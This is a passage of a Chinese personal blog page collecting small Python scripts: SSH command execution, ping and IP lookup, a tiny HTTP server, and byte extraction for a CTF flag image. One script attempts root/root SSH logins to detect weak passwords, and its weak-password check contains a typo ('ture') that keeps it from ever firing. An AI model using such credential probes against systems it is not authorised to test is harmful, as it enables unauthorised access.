+# 将输出和错拼接再打印出来
+print(printout.read())
+time.sleep(0)
+# 关闭ssh连接
+ssh.close()
+</code></pre>
+<h2 id="2-14-检测ssh服务是否存在"><a href="#2-14-检测ssh服务是否存在" class="headerlink" title="2.14 检测ssh服务是否存在"></a>2.14 检测ssh服务是否存在</h2><pre><code>import paramiko,time
+
+ips = [&quot;192.168.239.143&quot;]
+ports =  [&quot;22&quot;]
+for i in range(len(ips)):
+    # 创建SSHClient 实例对象
+    ssh = paramiko.SSHClient()
+    # 设置信任远程机器，允许访问
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    error = &quot;true&quot;
+    # ssh连接远程机器，参数为  地址、端口、用户名、密码
+    try:
+        ssh.connect(ips[i], ports[i], &quot;root&quot;, &quot;root&quot;,timeout=1)
+    except Exception as errmsg:
+        error = str(errmsg)
+
+
+    if &quot;Authentication failed&quot; in error:
+        print(&#39;\033[38;5;47m&#39;+ips[i]+&#39;该设备ssh服务存在！\033[0m&#39;)
+    elif &quot;ture&quot; in error:
+        print(&#39;\033[38;5;47m&#39;+ips[i]+&#39;该设备ssh服务弱口令：root！\033[0m&#39;)
+    else:
+        print(&#39;\033[1;31m&#39;+ips[i]+&#39;该设备ssh服务不存在！\033[0m&#39;)
+    time.sleep(0)
+    # 关闭ssh连接
+    ssh.close()
+</code></pre>
+<h2 id="2-15-检测py版本"><a href="#2-15-检测py版本" class="headerlink" title="2.15 检测py版本"></a>2.15 检测py版本</h2><pre><code class="python"># 检测py版本
+pyversion = sys.version.split()[0]
+if pyversion &gt;= &quot;3&quot; or pyversion &lt; &quot;2.7&quot;:
+    exit(&#39;需要安装 python version 2.6.x 或者 2.7.x&#39;)
+</code></pre>
+<h2 id="2-16-提示安装对应库"><a href="#2-16-提示安装对应库" class="headerlink" title="2.16 提示安装对应库"></a>2.16 提示安装对应库</h2><pre><code class="python">try:
+    import requests
+except:
+    print(&#39;pip install requests[security]&#39;)
+    os._exit(0)
+</code></pre>
+<h2 id="2-17-ping测试"><a href="#2-17-ping测试" class="headerlink" title="2.17 ping测试"></a>2.17 ping测试</h2><pre><code class="python"># ping
+def ceshi_ping(ip):
+    top = False
+    try:
+        ping = os.popen(&quot;ping &#123;&#125; -n 2&quot;.format(ip))
+        line = ping.read()
+        # print(line)
+        if &quot;的回复: 字节&quot; in line:
+            print(&#39;\033[32;1m[+]\033[0m IP&#123;&#125;连接成功！&#39;.format(ip))
+            top = True
+        else:
+            print(&#39;\033[31;1m[-]\033[0m IP&#123;&#125;连接失败。。。&#39;.format(ip))
+            top = False
+    except KeyboardInterrupt:
+        print(&quot;\033[31;1m[-]\033[0m 错误信息为：&#123;&#125;&quot;.format(&quot;您进行了Ctrl+C操作，程序将强制退出运行！&quot;))
+        sys.exit()
+    except BaseException as err:        #建议在是所有异常最后添加exceptcBaseException异常处理，对剩余异常一次做处理
+        print(&quot;\033[31;1m[-]\033[0m 错误信息为：&#123;&#125;&quot;.format(err))
+        top = False
+    return top
+</code></pre>
+<h2 id="2-18-获取当前主机IP"><a href="#2-18-获取当前主机IP" class="headerlink" title="2.18 获取当前主机IP"></a>2.18 获取当前主机IP</h2><pre><code class="python">import requests,re
+# 主代码
+def getIP():
+    # 用的是900查询获取的，所以可能会变动
+    headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3722.400 QQBrowser/10.5.3739.400&#39;&#125;
+    html = requests.get(&#39;https://ip.900cha.com/&#39;,headers=headers)
+    data = re.findall(&#39;准确归属地: (.*)&#39;,html.text)
+    print(data)
+
+getIP()
+</code></pre>
+<p>或者</p>
+<pre><code class="python"># python获取客户端ip
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+
+host = (&#39;0.0.0.0&#39;, 8000)
+
+
+class Request(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header(&#39;Content-type&#39;, &#39;application/json&#39;)
+        self.end_headers()
+        self.wfile.write(json.dumps(&#123;&#39;ip&#39;:self.client_address[0]&#125;).encode())
+
+
+if __name__ == &#39;__main__&#39;:
+    server = HTTPServer(host, Request)
+    print(&quot;[+] Starting server, listen at &#123;&#125;:&#123;&#125;&quot;.format(host[0], host[1]))
+    server.serve_forever()
+</code></pre>
+<h2 id="2-19-截取文件指定字节"><a href="#2-19-截取文件指定字节" class="headerlink" title="2.19 截取文件指定字节"></a>2.19 截取文件指定字节</h2><pre><code class="python">def extract_file(src, dst, beg, end):
+    # 打开原始文件
+    f = open(src, &quot;rb&quot;)
+    
+    # 移动文件指针到写入后文件的起始位置
+    f.seek(beg)
+    
+    # 读取写入后文件的数据
+    data = f.read(end - beg)
+    
+    # 关闭文件
+    f.close()
+    
+    # 打开目标文件
+    f = open(dst, &quot;wb&quot;)
+    
+    # 写入后文件的数据
+    f.write(data)
+    
+    # 保存文件
+    f.close()
+
+if __name__ == &quot;__main__&quot;:
+    extract_file(&quot;残缺flag.png&quot;, &quot;res.jpg&quot;, 0xB14,0xA0AB)
+</code></pre>
+
+    </div>
+    
+</div>
+
+    <div id="home-card">
+        <div id="card-div">
+    <div class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg " alt="avatar">
+        </div>
+        <div class="name">
+            小C&天天
+        </div>
+        <div class="descriptions">
+            
+            <div class="description">
+                修学储能 先博后渊
+            </div>
+            
+        </div>
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">
+                    kyrieee个人博客
+                </a>
+            </div>
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">
+                    tonyd0g
+                </a>
+            </div>
+            
+        </div>
+    </div>
+    <!-- 目录 -->
+    
+        <div class="card-style" style="width: 300px">
+            <div id="toc" class="toc-article">
+                <strong class="toc-title">文章目录</strong>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E8%AF%B4%E6%98%8E"><span class="toc-text">壹 说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E5%B0%8F%E8%84%9A%E6%9C%AC"><span class="toc-text">贰 小脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="toc-text">2.1 生成二维码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E4%BF%9D%E6%8C%81%E5%B1%8F%E5%B9%95%E5%AD%98%E6%B4%BB"><span class="toc-text">2.2 保持屏幕存活</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="toc-text">2.3 获取当前目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-python%E4%B9%8Bwifi%E7%A0%B4%E8%A7%A3"><span class="toc-text">2.4 python之wifi破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E5%8C%B9%E9%85%8D%E5%BD%93%E5%89%8D%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%8D%E5%AD%97"><span class="toc-text">2.5 匹配当前文件夹的所有文件的名字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">2.6 二进制转成字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-base%E7%BC%96%E7%A0%81"><span class="toc-text">2.7 base编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81"><span class="toc-text">2.8 凯撒密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9-python%E9%9A%8F%E6%9C%BA%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">2.9 python随机字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-10-%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%ADwarning%E7%9A%84%E8%BE%93%E5%87%BA"><span class="toc-text">2.10 如何关闭warning的输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-11-Ctrl-c%E9%80%80%E5%87%BA%E8%BF%9B%E7%A8%8B%E5%BC%82%E5%B8%B8"><span class="toc-text">2.11 Ctrl+c退出进程异常</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-12-%E6%A0%87%E5%BF%97%E9%A2%9C%E8%89%B2"><span class="toc-text">2.12 标志颜色</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-13-ssh%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">2.13 ssh执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-14-%E6%A3%80%E6%B5%8Bssh%E6%9C%8D%E5%8A%A1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-text">2.14 检测ssh服务是否存在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-15-%E6%A3%80%E6%B5%8Bpy%E7%89%88%E6%9C%AC"><span class="toc-text">2.15 检测py版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-16-%E6%8F%90%E7%A4%BA%E5%AE%89%E8%A3%85%E5%AF%B9%E5%BA%94%E5%BA%93"><span class="toc-text">2.16 提示安装对应库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-17-ping%E6%B5%8B%E8%AF%95"><span class="toc-text">2.17 ping测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-18-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E4%B8%BB%E6%9C%BAIP"><span class="toc-text">2.18 获取当前主机IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-19-%E6%88%AA%E5%8F%96%E6%96%87%E4%BB%B6%E6%8C%87%E5%AE%9A%E5%AD%97%E8%8A%82"><span class="toc-text">2.19 截取文件指定字节</span></a></li></ol></li></ol>
+            </div>    
+        </div>
+        
+    </div>
+</div>
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            @小C&天天
+        </div>
+        <div>
+            备案号：小C&天天の窝
+        </div>
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+        <!-- 3D模型 -->
+        <div id="L2dCanvas" style="position: relative;"></div>
+        <script src="/js/live2d.min.js"></script>
+        <script src="/css/live2d.css"></script>
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "zhala_2",
+                mobile: true,
+            });
+        </script>
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/background.js"></script>
+    </body>
+</html>
